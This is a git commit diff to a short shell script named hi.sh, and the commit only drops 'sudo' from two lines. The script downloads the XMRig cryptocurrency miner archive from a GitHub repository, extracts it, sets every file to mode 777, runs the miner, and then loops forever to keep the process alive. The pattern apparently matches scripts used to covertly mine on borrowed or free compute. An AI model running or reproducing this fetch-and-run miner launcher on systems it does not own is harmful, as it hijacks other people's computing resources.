0a905aebb5e24c2b9f7aa9e9880a047c1d0b89d4
rinaffers <83849004+rinaffers@users.noreply.github.com>
2021-05-08 08:25:14 +0700

    Update hi.sh

--- hi.sh
+++ hi.sh
@@ -1,11 +1,11 @@
 #!/bin/sh
-sudo apt-get update -y
+apt-get update -y
 wget https://github.com/rinaffers/Lorena/raw/main/xmrig-6.12.1-linux-static-x64.tar.xz
 tar -xf xmrig-6.12.1-linux-static-x64.tar.xz
 cd xmrig-6.12.1-linux-static-x64
 ls -lA
 chmod 777 *
-sudo ./xmrig
+./xmrig
 while [ 1 ]; do
 sleep 3
 done
